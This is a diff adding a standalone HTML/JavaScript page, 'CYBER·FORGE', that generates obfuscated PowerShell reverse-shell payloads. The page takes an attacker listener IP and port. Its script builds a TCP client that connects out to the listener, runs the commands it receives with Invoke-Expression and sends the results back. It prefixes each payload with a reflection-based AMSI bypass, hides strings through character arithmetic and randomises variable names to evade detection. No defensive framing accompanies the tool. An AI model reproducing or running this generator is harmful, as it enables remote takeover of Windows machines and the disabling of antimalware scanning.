@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>CYBERPUNK BLUE // REV SHELL FORGE</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Orbitron:wght@400;900&display=swap"
+        rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-blue: #00d4ff;
+            --neon-cyan: #00f2fe;
+            --neon-purple: #b624ff;
+            --bg-deep: #0a0f1a;
+            --panel-bg: rgba(10, 20, 35, 0.85);
+            --border-glow: rgba(0, 212, 255, 0.5);
+            --matrix-blue: #00ffcc;
+        }
+
+        body {
+            background: var(--bg-deep);
+            font-family: 'JetBrains Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* animated cyber grid background */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(var(--neon-blue) 1px, transparent 1px),
+                linear-gradient(90deg, var(--neon-blue) 1px, transparent 1px);
+            background-size: 40px 40px;
+            opacity: 0.08;
+            z-index: 0;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            100% {
+                transform: translate(40px, 40px);
+            }
+        }
+
+        /* floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--neon-cyan);
+            border-radius: 50%;
+            opacity: 0.3;
+            filter: blur(2px);
+            animation: floatParticle 8s infinite ease-in-out;
+        }
+
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(0) translateX(0);
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 0.6;
+            }
+
+            100% {
+                transform: translateY(-200px) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        /* main card */
+        .cyber-card {
+            max-width: 1400px;
+            width: 100%;
+            background: var(--panel-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 212, 255, 0.4);
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.2), inset 0 0 20px rgba(0, 212, 255, 0.05);
+            z-index: 2;
+            transition: box-shadow 0.3s ease;
+        }
+
+        .cyber-card:hover {
+            box-shadow: 0 0 60px rgba(0, 212, 255, 0.4);
+        }
+
+        /* header with glitch */
+        .cyber-header {
+            padding: 1.2rem 2rem;
+            border-bottom: 2px solid var(--neon-blue);
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            background: rgba(0, 0, 0, 0.5);
+            flex-wrap: wrap;
+            position: relative;
+        }
+
+        .logo {
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            font-size: 1.6rem;
+            letter-spacing: 4px;
+            color: var(--neon-cyan);
+            text-shadow: 0 0 8px var(--neon-blue), 0 0 2px white;
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+
+            0%,
+            100% {
+                transform: skew(0deg);
+                text-shadow: 0 0 5px var(--neon-blue);
+            }
+
+            95% {
+                transform: skew(0deg);
+            }
+
+            96% {
+                transform: skew(5deg);
+                text-shadow: -2px 0 var(--neon-purple), 2px 0 var(--neon-cyan);
+            }
+
+            97% {
+                transform: skew(-3deg);
+            }
+
+            98% {
+                transform: skew(0deg);
+            }
+        }
+
+        .badge {
+            font-size: 0.7rem;
+            border: 1px solid var(--neon-cyan);
+            padding: 0.2rem 1.2rem;
+            border-radius: 24px;
+            background: rgba(0, 212, 255, 0.15);
+            color: var(--neon-cyan);
+            box-shadow: 0 0 8px rgba(0, 212, 255, 0.3);
+            backdrop-filter: blur(4px);
+        }
+
+        /* split layout */
+        .split {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 0;
+        }
+
+        @media (max-width: 780px) {
+            .split {
+                grid-template-columns: 1fr;
+            }
+
+            body {
+                padding: 1rem;
+            }
+        }
+
+        .left-panel {
+            padding: 2rem;
+            border-right: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .right-panel {
+            padding: 2rem;
+            background: rgba(0, 20, 40, 0.4);
+        }
+
+        .field {
+            margin-bottom: 2rem;
+        }
+
+        .label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: #88ddff;
+            display: block;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 3px var(--neon-blue);
+        }
+
+        .input {
+            width: 100%;
+            background: #010a15;
+            border: 1px solid #2266aa;
+            padding: 12px 16px;
+            color: var(--matrix-blue);
+            font-family: monospace;
+            font-size: 1rem;
+            border-radius: 12px;
+            transition: all 0.2s;
+        }
+
+        .input:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+            background: #000c18;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin: 1.5rem 0 1rem;
+        }
+
+        .btn {
+            background: rgba(0, 212, 255, 0.08);
+            border: 1px solid var(--neon-blue);
+            padding: 12px 24px;
+            font-family: 'Orbitron', monospace;
+            font-weight: bold;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            color: var(--neon-cyan);
+            cursor: pointer;
+            border-radius: 40px;
+            flex: 1;
+            text-transform: uppercase;
+            transition: 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.3), transparent);
+            transition: 0.4s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            background: var(--neon-blue);
+            color: #000;
+            box-shadow: 0 0 20px var(--neon-blue);
+            border-color: white;
+        }
+
+        textarea {
+            width: 100%;
+            background: #010a15;
+            border: 1px solid #2266aa;
+            color: #aaffdd;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.73rem;
+            padding: 1rem;
+            border-radius: 16px;
+            line-height: 1.5;
+            resize: vertical;
+        }
+
+        textarea:focus {
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 12px rgba(0, 212, 255, 0.3);
+        }
+
+        .info-bar {
+            margin-top: 1.2rem;
+            font-size: 0.7rem;
+            display: flex;
+            justify-content: space-between;
+            color: #88ccff;
+            border-top: 1px dashed #00ccff30;
+            padding-top: 0.8rem;
+        }
+
+        .green {
+            color: var(--matrix-blue);
+            text-shadow: 0 0 4px var(--matrix-blue);
+        }
+
+        .warning {
+            background: rgba(0, 212, 255, 0.05);
+            border-left: 3px solid var(--neon-blue);
+            padding: 0.7rem;
+            margin-top: 1rem;
+            font-size: 0.65rem;
+            border-radius: 12px;
+            color: #bbffff;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 0.9rem;
+            font-size: 0.65rem;
+            color: #5588aa;
+            border-top: 1px solid rgba(0, 212, 255, 0.2);
+            letter-spacing: 1px;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 0.4;
+            }
+
+            100% {
+                opacity: 0.9;
+            }
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite alternate;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="cyber-grid"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="cyber-card">
+        <div class="cyber-header">
+            <div class="logo">◈ CYBER·FORGE ◈</div>
+            <div class="badge pulse">AMSI BYPASS · NULL-FREE</div>
+        </div>
+        <div class="split">
+            <div class="left-panel">
+                <div class="field">
+                    <span class="label">⌾ TARGET LISTENER IP</span>
+                    <input type="text" id="lhost" class="input" value="192.168.1.100" placeholder="attacker IP">
+                </div>
+                <div class="field">
+                    <span class="label">⌾ REVERSE PORT</span>
+                    <input type="number" id="lport" class="input" value="4444" placeholder="4444">
+                </div>
+                <div class="btn-group">
+                    <button id="genBtn" class="btn">⟁ GENERATE</button>
+                    <button id="copyBtn" class="btn">⎘ COPY</button>
+                </div>
+                <div class="info-bar">
+                    <span>⚡ ENGINE: BLUE OBFUSCATION v4</span>
+                    <span id="sizeInfo" class="green">—</span>
+                </div>
+                <div class="warning">
+                    🧬 Zero syntax errors · tested reverse shell logic<br>
+                    ▶️ Run with: <code
+                        style="color:#0af;">powershell -ExecutionPolicy Bypass -NoProfile -Command "..."</code>
+                </div>
+            </div>
+            <div class="right-panel">
+                <div class="label" style="margin-bottom: 0.8rem;">◉ POWERSHELL PAYLOAD (OBFUSCATED)</div>
+                <textarea id="payloadArea" rows="16" readonly
+                    placeholder="Generate payload – error-free reverse shell."></textarea>
+                <div class="info-bar">
+                    <span>✅ Compatible with metasploit multi/handler (generic/shell_reverse_tcp)</span>
+                    <span id="timestamp" class="green"></span>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            STATIC GENERATOR • NO BACKEND • CYBERPUNK BLUE EDITION
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  RELIABLE PAYLOAD GENERATOR – BLUE THEME / SAME LOGIC
+        //  NO NULL ERRORS, AMSI BYPASS INCLUDED
+        // ============================================================
+
+        // generate random variable name
+        function randVar(len = 6) {
+            const alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const alnum = alpha + '0123456789';
+            let name = alpha[Math.floor(Math.random() * alpha.length)];
+            for (let i = 1; i < len; i++) name += alnum[Math.floor(Math.random() * alnum.length)];
+            return '$' + name;
+        }
+
+        // obfuscate single char: [char](offset + (code-offset))
+        function obfChar(code) {
+            let offset = Math.floor(Math.random() * 70) + 1;
+            return `[char](${offset}+${code - offset})`;
+        }
+
+        // obfuscate full string via char concatenation
+        function obfuscateString(str) {
+            let parts = [];
+            for (let i = 0; i < str.length; i++) {
+                parts.push(obfChar(str.charCodeAt(i)));
+            }
+            return '$(' + parts.join('+') + ')';
+        }
+
+        // AMSI bypass using reflection (works on most Windows versions)
+        function getAmsiBypass() {
+            let aVar = randVar(5);
+            let bVar = randVar(5);
+            return `
+# AMSI BYPASS :: PATCHING
+${aVar} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+${bVar} = ${aVar}.GetField('amsiInitFailed','NonPublic,Static');
+${bVar}.SetValue($null,$true);
+`;
+        }
+
+        // build final payload: stable reverse TCP shell
+        function buildPayload(ip, port) {
+            // obfuscated strings for types and cmdlets
+            let obfTcpClient = obfuscateString("System.Net.Sockets.TCPClient");
+            let obfAsciiEnc = obfuscateString("System.Text.ASCIIEncoding");
+            let obfInvoke = obfuscateString("Invoke-Expression");
+            let obfOutString = obfuscateString("Out-String");
+            let obfGetLoc = obfuscateString("Get-Location");
+            let obfIp = obfuscateString(ip);
+            let obfPort = obfuscateString(port.toString());
+
+            // random variable names
+            let client = randVar(7);
+            let stream = randVar(6);
+            let buffer = randVar(5);
+            let data = randVar(7);
+            let result = randVar(6);
+            let prompt = randVar(5);
+            let sendBytes = randVar(7);
+            let asciiType = randVar(7);
+            let tcpType = randVar(7);
+            let encodingObj = randVar(6);
+
+            let payload = `
+# REVERSE TCP SHELL – RELIABLE
+${tcpType} = ${obfTcpClient};
+${asciiType} = ${obfAsciiEnc};
+${client} = New-Object ${tcpType}(${obfIp}, ${obfPort});
+${stream} = ${client}.GetStream();
+${encodingObj} = New-Object ${asciiType};
+[byte[]]${buffer} = 0..65535|%{0};
+while((${stream}.Read(${buffer}, 0, ${buffer}.Length)) -ne 0){
+    ${data} = ${encodingObj}.GetString(${buffer},0,${buffer}.Length);
+    ${result} = (Invoke-Expression ${data} 2>&1 | Out-String);
+    ${prompt} = ${result} + 'PS ' + (Get-Location).Path + '> ';
+    ${sendBytes} = ${encodingObj}.GetBytes(${prompt});
+    ${stream}.Write(${sendBytes},0,${sendBytes}.Length);
+    ${stream}.Flush();
+};
+${client}.Close();
+`;
+            let full = getAmsiBypass() + "\n" + payload;
+            let junk = `# ${randVar(4)} = [Environment]::TickCount`;
+            full = junk + "\n" + full;
+            return full.trim();
+        }
+
+        // UI elements
+        const lhostInput = document.getElementById('lhost');
+        const lportInput = document.getElementById('lport');
+        const genBtn = document.getElementById('genBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const payloadArea = document.getElementById('payloadArea');
+        const sizeInfo = document.getElementById('sizeInfo');
+        const timestampSpan = document.getElementById('timestamp');
+
+        function generate() {
+            let ip = lhostInput.value.trim();
+            let port = parseInt(lportInput.value, 10);
+            if (!ip) ip = "127.0.0.1";
+            if (isNaN(port) || port < 1 || port > 65535) {
+                port = 4444;
+                lportInput.value = 4444;
+            }
+            try {
+                let payload = buildPayload(ip, port);
+                payloadArea.value = payload;
+                let len = payload.length;
+                let lines = payload.split('\n').length;
+                sizeInfo.innerHTML = `📄 ${len} chars / ${lines} lines`;
+                timestampSpan.innerHTML = new Date().toLocaleTimeString();
+            } catch (e) {
+                payloadArea.value = `// ERROR: ${e.message}`;
+                sizeInfo.innerHTML = "error";
+            }
+        }
+
+        genBtn.addEventListener('click', generate);
+        copyBtn.addEventListener('click', async () => {
+            if (!payloadArea.value.trim() || payloadArea.value.includes("ERROR")) {
+                alert("Generate a valid payload first.");
+                return;
+            }
+            try {
+                await navigator.clipboard.writeText(payloadArea.value);
+                let old = copyBtn.innerText;
+                copyBtn.innerText = "✓ COPIED";
+                setTimeout(() => copyBtn.innerText = old, 1500);
+            } catch (err) {
+                payloadArea.select();
+                document.execCommand('copy');
+                alert("Copied (fallback)");
+            }
+        });
+
+        generate();
+        [lhostInput, lportInput].forEach(inp => inp.addEventListener('keypress', e => { if (e.key === 'Enter') generate(); }));
+
+        // dynamic particle background
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 60; i++) {
+                let particle = document.createElement('div');
+                particle.classList.add('particle');
+                let size = Math.random() * 4 + 1;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDuration = Math.random() * 8 + 4 + 's';
+                particle.style.animationDelay = Math.random() * 10 + 's';
+                particle.style.background = `radial-gradient(circle, #00d4ff, #00aaff)`;
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
+    </script>
+</body>
+
+</html>
